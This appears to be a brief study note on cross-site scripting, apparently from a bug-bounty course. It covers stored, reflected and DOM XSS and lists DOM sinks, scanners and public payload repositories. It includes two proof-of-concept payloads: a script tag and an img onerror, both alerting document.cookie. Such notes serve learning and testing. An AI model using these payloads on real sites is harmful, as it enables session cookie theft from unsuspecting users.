# XSS

## Stored & Reflected

```html
<script>alert(document.cookie)</script>
```

![Pasted image 20240927172636.png](../../assets/images/f776d8605dd6b2e70b75.png)

![Pasted image 20240927172309.png](../../assets/images/f760422f6c364a826de3.png)

## DOM 

Some of the commonly used JavaScript functions to write to DOM objects are:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Furthermore, some of the `jQuery` library functions that write to DOM objects are:

- `add()`
- `after()`
- `append()`

```html
<img src="" onerror=alert(document.cookie)>
```


## Automated Discovery

https://github.com/s0md3v/XSStrike

Burp scanner

[Captura pendiente de revisión: Pasted image 20240927175051.png](../../Resources/Audit/media.csv)
## Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | 7- XSS/1 - XSS.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
